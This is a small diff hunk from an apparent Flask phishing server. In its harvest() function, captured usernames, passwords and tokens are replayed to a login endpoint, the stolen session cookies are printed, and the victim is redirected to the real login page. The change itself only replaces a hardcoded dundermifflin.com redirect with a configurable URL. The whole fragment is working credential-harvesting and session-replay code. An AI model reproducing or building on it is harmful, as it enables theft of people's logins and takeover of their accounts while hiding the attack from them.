@@ -37,7 +37,7 @@ def harvest():
     print('\n=========== COOKIES AFTER REPLAY ========')
     cookies = login(username, passwd, token)
     print(cookies)
-    return redirect("http://dundermifflin.com/login", code=307)
+    return redirect(loginURL, code=307)
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=8080)
